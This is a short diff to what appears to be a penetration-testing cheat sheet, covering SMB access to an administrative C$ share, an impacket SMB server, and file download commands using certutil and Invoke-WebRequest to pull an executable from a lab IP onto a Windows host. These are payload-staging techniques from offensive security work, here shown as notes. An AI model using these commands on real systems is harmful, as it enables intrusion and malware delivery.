@@ -41,8 +41,8 @@ smbclient //192.168.1.1/C$ -U DC_name\\account
 impacket-smbserver share /tmp/smb -smb2support --debug
 
 # Download File   
-certutil -urlcache -split -f <URL> <輸出檔名>  
-iwr
+certutil -urlcache -split -f <URL> <dst_file>  
+Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 
 # Windows Remote  
 ## WinRM   
